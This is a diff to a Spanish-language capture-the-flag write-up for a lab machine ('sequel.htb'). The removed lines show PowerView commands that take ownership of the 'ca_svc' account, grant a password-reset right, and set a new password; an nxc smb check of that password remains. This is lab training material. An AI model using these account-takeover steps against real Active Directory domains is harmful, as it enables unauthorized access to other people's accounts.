@@ -318,31 +318,7 @@ upload PowerView.ps1
 ```
 
 
-Importamos el modulo
-```shell
-Import-Module .\PowerView.ps1
-```
-
-Y nos hacemos dueños del usuario `ca_scv`
-```shell
-Set-DomainObjectOwner -Identity "ca_svc" -OwnerIdentity "ryan"
-```
-
-Cambiamos la contraseña con
-```shell
-Add-DomainObjectAcl -TargetIdentity "ca_svc" -Rights ResetPassword -PrincipalIdentity "ryan"
-```
-
-Cambiaos la contraseña
-```shell
-$cred = ConvertTo-SecureString -String "Password123!!" -AsPlainText -Force
-```
-
-Seteamos la contraseña
-```shell
-Set-DomainUserPassword -Identity "ca_svc" -AccountPassword $cred
-```
-
+I
 Verificamos que se haya realizado el cambio de contraseña
 ```shell
 nxc smb sequel.htb -u ca_svc -p 'Password123!!'
